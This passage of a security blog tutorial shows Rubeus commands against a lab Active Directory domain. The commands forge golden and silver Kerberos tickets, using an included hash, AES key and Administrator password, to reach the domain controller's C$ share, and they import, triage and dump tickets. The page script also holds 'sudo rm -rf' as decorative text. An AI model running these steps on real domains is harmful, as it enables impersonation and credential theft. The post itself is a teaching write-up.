<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA&#x2F;s16000&#x2F;20.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>As you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal</p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA&#x2F;s16000&#x2F;21.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>Also, at the end you’ll see a one liner command that can be used to generate this TGT again.</p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ&#x2F;s16000&#x2F;22.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>Various other options can be used in conjunction with golden to modify the generated TGT like:</p>
<ul>
<li><p>&#x2F;rangeinterval: After every time specified, a new ticket will be generated.</p>
</li>
<li><p>&#x2F;rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.</p>
</li>
</ul>
<p>For a full list of modifications, see <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus#ticket-forgery">this</a> page.</p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ&#x2F;s16000&#x2F;23.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p>Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page <strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">here</a></strong>.</p>
<p>Silver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:</p>
<ul>
<li><p>&#x2F;service: SPN of the service ticket is being generated for</p>
</li>
<li><p>&#x2F;rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket</p>
</li>
<li><p>&#x2F;user: username of the user whose hash is provided</p>
</li>
<li><p>&#x2F;creduser: User to be impersonated</p>
</li>
<li><p>&#x2F;credpassword: Password of the user to be impersonated</p>
</li>
<li><p>&#x2F;krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.</p>
</li>
<li><p>&#x2F;krbenctype: type of encrypted hash used. Aes256 here.</p>
</li>
</ul>
<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>
<p><code>rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA&#x2F;s16000&#x2F;24.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>This helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive</p>
<p><code>dir \\dc1.ignite.local\c$</code><br><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA&#x2F;s16000&#x2F;25.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<h3 id="Ticket-Management"><a href="#Ticket-Management" class="headerlink" title="Ticket Management"></a>Ticket Management</h3><p>Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.</p>
<p><strong>Ptt</strong></p>
<p>The Rubeus ptt option can import the supplied ticket in command line. The &#x2F;ptt can also be used in conjunction with other options that output tickets. For example,</p>
<p><code>rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA&#x2F;s16000&#x2F;26.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>As you can see, the generated ticket has now been imported.</p>
<p><strong>Purge</strong></p>
<p>Rubeus has a purge option which can purge&#x2F;delete all the tickets existing in the current session.</p>
<p>Here, we demonstrate how we purged 2 tickets listed by klist.</p>
<p><code>rubeus.exe purge</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg&#x2F;s16000&#x2F;27.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Describe</strong></p>
<p>Often we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.</p>
<p>We can provide the ticket using &#x2F;ticket flag.</p>
<p><code>rubeus.exe describe /ticket:doIFNDCCBTCg...bA==</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A&#x2F;s16000&#x2F;28.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Triage</strong></p>
<p>While klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.</p>
<ul>
<li>&#x2F;luid: This flag can be used to provide a specific user ID.</li>
</ul>
<p><code>rubeus.exe triage</code><br><code>rubeus.exe triage /luid:*0x8f57c*</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w&#x2F;s16000&#x2F;29.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>Also, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)</p>
<p><code>rubeus.exe purge /luid:*0x8f57c*</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ&#x2F;s16000&#x2F;30.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Dump</strong></p>
<p>If the session is running in an elevated mode, a user can dump&#x2F; extract all the current TGTs and service tickets. Again, &#x2F;luid can be provided to dump specific user’s tickets. &#x2F;service can be used to filter these tickets.</p>
<p>For example, &#x2F;service:krbtgt displays only TGTs.</p>
<p><code>rubeus.exe dump</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw&#x2F;s16000&#x2F;31.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>Next part I’ll work on the mitigation bit as it’s own unit hope you learnt a few bit on the read … 😊   </p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://malw0re.github.io/malwore.github.io">Malw0re</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://malw0re.github.io/malwore.github.io/2023/07/13/kerberos-101/">https://malw0re.github.io/malwore.github.io/2023/07/13/kerberos-101/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/malwore.github.io/tags/Active-Directory/">Active-Directory</a></div><div class="post-share"><div class="social-share" data-image="/malwore.github.io/images/qwe.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/malwore.github.io/2022/05/23/about/" title="about"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">about</div></div><div class="info-2"><div class="info-item-1">My ResumeWork ExperienceFr334aksNairobi	CTF PlayerJune 2021 to Present SkillsProgramming languages Technical EducationCertificationseLearnSecurity Junior Penetration Tester (eJPTv2)eLearnSecurity Dec 2023  Credential ID  </div></div></div></a><a class="pagination-related" href="/malwore.github.io/2023/08/09/ad-credential-enumeration/" title="AD CRED ENUM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">AD CRED ENUM</div></div><div class="info-2"><div class="info-item-1"> Credential EnumerationAfter acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:  Domain users Computer Attributes group membership Group Policy Objects Permissions ACLs Trusts  but not limited to the above, but the most important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level. So at a minimum, you need to have acquired a user’s cleart...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/malwore.github.io/2023/08/09/ad-credential-enumeration/" title="AD CRED ENUM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-09</div><div class="info-item-2">AD CRED ENUM</div></div><div class="info-2"><div class="info-item-1"> Credential EnumerationAfter acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:  Domain users Computer Attributes group membership Group Policy Objects Permissions ACLs Trusts  but not limited to the above, but the most important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level. So at a minimum, you need to have acquired a user’s cleart...</div></div></div></a><a class="pagination-related" href="/malwore.github.io/2024/01/04/acls/" title="ACL AD"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-04</div><div class="info-item-2">ACL AD</div></div><div class="info-2"><div class="info-item-1">Access Control List (ACL) Abuse PrimerFor security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it. Access Control List (ACL) OverviewIn their simplest form, ACLs are lists that define a) who has access to which asset...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/malwore.github.io/images/qwe.png" onerror="this.onerror=null;this.src='/malwore.github.io/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Malw0re</div><div class="author-info-description"></div><div class="site-data"><a href="/malwore.github.io/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/malwore.github.io/tags/"><div class="headline">Tags</div><div class="length-num">13</div></a><a href="/malwore.github.io/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/malw0re/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/malw0re/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/brian-karanja-21331b164/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.x.com/M4LW0R3" target="_blank" title="twitter"><i class="fab fa-twitter" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my blog  where I post my writeups from Boxes & CTFs along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.</span> <span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-Kerb-Auth-works"><span class="toc-number">1.1.</span> <span class="toc-text">How Kerb Auth works!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPNs"><span class="toc-number">2.</span> <span class="toc-text">SPNs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPNS-syntax"><span class="toc-number">2.1.</span> <span class="toc-text">SPNS syntax</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Type-of-SPN"><span class="toc-number">2.2.</span> <span class="toc-text">Type of SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Perspective"><span class="toc-number">2.3.</span> <span class="toc-text">Linux Perspective</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-Procedure"><span class="toc-number">2.3.1.</span> <span class="toc-text">Attack Procedure.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tools"><span class="toc-number">2.3.2.</span> <span class="toc-text">Tools.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-efficiency-of-Attack"><span class="toc-number">2.3.3.</span> <span class="toc-text">The efficiency of Attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetUserSPNs-py"><span class="toc-number">2.3.4.</span> <span class="toc-text">GetUserSPNs.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Requesting-all-TGS-tickets"><span class="toc-number">2.3.5.</span> <span class="toc-text">Requesting all TGS tickets.**</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Requesting-a-Single-TGS-Ticket"><span class="toc-number">2.3.6.</span> <span class="toc-text">Requesting a Single TGS Ticket.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Perspective"><span class="toc-number">2.4.</span> <span class="toc-text">Windows Perspective</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumerating-SPNs-with-setspn-exe"><span class="toc-number">2.4.1.</span> <span class="toc-text">Enumerating SPNs with setspn.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Retrieving-All-Tickets-using-setspn-exe"><span class="toc-number">2.4.2.</span> <span class="toc-text">Retrieving All Tickets using setspn.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Targeting-a-Single-User"><span class="toc-number">2.4.3.</span> <span class="toc-text">Targeting a Single User**************</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Tickets-from-Memory-with-Mimikatz"><span class="toc-number">2.5.</span> <span class="toc-text">Extracting Tickets from Memory with Mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Skipped-Version"><span class="toc-number">2.5.1.</span> <span class="toc-text">Skipped Version</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AUTOMATE-VERSION"><span class="toc-number">2.5.2.</span> <span class="toc-text">AUTOMATE VERSION</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REBEUS"><span class="toc-number">3.</span> <span class="toc-text">REBEUS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ticket-Operations"><span class="toc-number">3.1.</span> <span class="toc-text">Ticket Operations</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Asktgt"><span class="toc-number">3.1.1.</span> <span class="toc-text">Asktgt</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Klist"><span class="toc-number">3.2.</span> <span class="toc-text">Klist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Renew"><span class="toc-number">3.3.</span> <span class="toc-text">Renew</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Golden-Ticket"><span class="toc-number">3.4.</span> <span class="toc-text">Golden Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Silver-Ticket"><span class="toc-number">3.5.</span> <span class="toc-text">Silver Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ticket-Management"><span class="toc-number">3.6.</span> <span class="toc-text">Ticket Management</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/malwore.github.io/2025/09/14/hello-world/" title="Some Research">Some Research</a><time datetime="2025-09-13T21:00:00.000Z" title="Created 2025-09-14 00:00:00">2025-09-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/malwore.github.io/2025/09/14/hello/" title="HTB Machine - SomeMachine">HTB Machine - SomeMachine</a><time datetime="2025-09-13T21:00:00.000Z" title="Created 2025-09-14 00:00:00">2025-09-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/malwore.github.io/2025/05/15/DSyncAttack/" title="DSyncAttack">DSyncAttack</a><time datetime="2025-05-15T19:51:49.000Z" title="Created 2025-05-15 22:51:49">2025-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/malwore.github.io/2025/02/02/wiriteup-test/" title="test post">test post</a><time datetime="2025-02-02T17:13:16.000Z" title="Created 2025-02-02 20:13:16">2025-02-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/malwore.github.io/2025/02/02/home/" title="hello.md">hello.md</a><time datetime="2025-02-02T17:11:22.000Z" title="Created 2025-02-02 20:11:22">2025-02-02</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2020 - 2025 By Malw0re</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/malwore.github.io/js/utils.js?v=5.5.0"></script><script src="/malwore.github.io/js/main.js?v=5.5.0"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,ntsystem,sudo rm -rf,root,administrator,ctfs,sliver,cobalt strike,python,c#,malw0re,empire,( ͡° ͜ʖ ͡°)" 